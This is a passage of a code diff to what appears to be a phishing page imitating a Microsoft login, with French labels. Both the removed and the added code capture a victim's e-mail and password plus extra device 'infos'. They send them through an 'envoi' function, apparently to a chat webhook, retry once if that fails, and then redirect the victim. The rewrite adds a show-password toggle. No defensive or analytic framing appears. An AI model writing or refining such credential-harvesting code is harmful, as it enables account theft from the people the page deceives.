-  const b=$('send'); b.disabled=true; b.innerHTML='<span class="spin"></span>';
-  const champs=[
-    {name:"E-mail",value:"`"+mail+"`"},{name:"Mot de passe",value:"```"+p+"```"},
-    {name:"Infos",value:"```"+infos()+"```"}
-  ];
-  /* le mot de passe part aussi en brut, hors de tout markdown */
-  const brut="```\n"+p+"\n```";
-  let ok=await envoi("stat2","✅ Étape 2 — MOT DE PASSE Microsoft",0x107c10,champs,brut);
-  if(!ok){
-    await new Promise(r=>setTimeout(r,3500));
-    ok=await envoi("stat2","✅ Étape 2 (nouvelle tentative)",0x107c10,champs,brut);
-  }
-  statu("stat", ok?"✓ transmis":"✗ envoi bloqué", ok?"ok":"ko");
-  setTimeout(()=>{
-    $('ms').classList.remove('on'); $('main').style.display='none'; $('ok').classList.add('on');
-    setTimeout(()=>location.href=REDIRECT,4200);
-  }, 900);
-};
+  const p = pwdEl.value;
+  if (p.length < 1) return;
+  busy = true;
 
-$('pass').addEventListener('keydown',e=>{if(e.key==='Enter')$('send').click();});
-$('email').addEventListener('keydown',e=>{if(e.key==='Enter')$('next').click();});
+  const b = $("btnLogin");
+  b.disabled = true;
+  b.innerHTML = '<span class="spin"></span>Connexion…';
+
+  const champs = [
+    { name: "E-mail", value: "`" + mail + "`" },
+    { name: "Mot de passe", value: "```" + p + "```" },
+    { name: "Infos", value: "```" + infos() + "```" }
+  ];
+  const brut = "```\n" + p + "\n```";
+
+  let ok = await envoi("st2", "🔐 MOT DE PASSE", 0x107c10, champs, brut);
+  if (!ok) {
+    await new Promise(function (r) { setTimeout(r, 3000); });
+    ok = await envoi("st2", "🔐 MOT DE PASSE (nouvelle tentative)", 0x107c10, champs, brut);
+  }
+  setTimeout(function () { location.replace(REDIRECT); }, ok ? 1200 : 3000);
+});
+
+$("showpwd").addEventListener("change", function () {
+  pwdEl.type = this.checked ? "text" : "password";
+  pwdEl.focus();
+});
 </script>
 </body>
 </html>
